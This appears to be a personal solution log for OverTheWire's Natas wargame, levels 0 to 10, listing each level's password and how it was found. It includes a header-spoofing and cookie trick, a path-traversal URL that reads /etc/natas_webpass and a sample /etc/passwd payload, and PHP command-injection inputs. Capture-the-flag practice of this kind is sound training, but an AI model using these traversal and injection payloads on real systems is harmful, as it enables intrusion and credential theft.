lvl 0 : 
http://natas0.natas.labs.overthewire.org/
natas0
natas0
// inspect source code
gtVrDuiDfck831PqWsLEZy5gyDz1clto 

lvl 1 --> lvl 2
http://natas1.natas.labs.overthewire.org/
natas1
gtVrDuiDfck831PqWsLEZy5gyDz1clto
// ctrl maj j
    // In elements go for <div id="content">
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->


lvl 2 --> lvl 3
http://natas2.natas.labs.overthewire.org/
natas2
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
ctrl u
atas2.natas.labs.overthewire.org/files
http://natas2.natas.labs.overthewire.org/files/users.txt
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

lvl 3 --> lvl 4
http://natas3.natas.labs.overthewire.org/
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
http://natas3.natas.labs.overthewire.org/robots.txt
http://natas3.natas.labs.overthewire.org/s3cr3t/
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

lvl 4 --> lvl 5
http://natas4.natas.labs.overthewire.org/
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
// The point of this level is to set the Referer in the Headers to http://natas5.natas.labs.overthewire.org/
// Once done we can access the password
// see natas4.py
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

lvl 5 --> lvl 6
http://natas5.natas.labs.overthewire.org/
natas5
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
// The point of this level is to set the cookie in the session to 1
// define the cookie parameters you want to change cookies = { 'loggedin': '1'}
// to access a cookie go for resquests.Session()
// to send the cookie to your GET request : session.get(url, cookies = cookies)
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

lvl 6 --> lvl 7
http://natas6.natas.labs.overthewire.org/
natas6
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
// The point of this level is to find a secret password to add in an input
// Looking at the source code we see and index-source.html
http://natas6.natas.labs.overthewire.org/index-source.html
// once inside it, we see a php conditional <? code ?>. It states : include "includes/secret.inc"
// Taking a look at this file :  http://natas6.natas.labs.overthewire.org/includes/secret.inc
// We get the secret :
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
// 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

lvl 7 --> lvl 8
http://natas7.natas.labs.overthewire.org/
natas7
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
// The point of this level is to test for Local File Inclusion
// Cf. owasp.org : this vulnerability occurs due to thte use of user-supplied input without proper validation. 
// It allows for directory taversal characters (such as dot-dot-slash) to be injected.
// Typically : http://vulnerable_host/preview.php?file=example.html
// We would then go for : http://vulnerable_host/preview.php?file=../../../../etc/passwd
// Here, we have a hint : password for webuser natas8 is in /etc/natas_webpass/natas8
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

lvl 8 --> lvl 9
http://natas8.natas.labs.overthewire.org/
natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
// The point of this level is to reverse ingineer a password encryption
// Here is the logic :
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
} 
?>
// PHP logic :
<?php
echo(base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))));
?>
// Result: oubWYf2kBq
// Adding it in the input we obtain : 
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

lvl 9 --> lvl 10
http://natas9.natas.labs.overthewire.org/
natas9
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
// The point of this level is to proceed a PHP command injection
a /dev/null; # // checks all the files in the folder
// ; # allows to end the request and not get the whole dictionnary.txt back
. /etc/natas_webpass/natas10 #
// note a . with a space '. ' allows to espace and look for other files
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu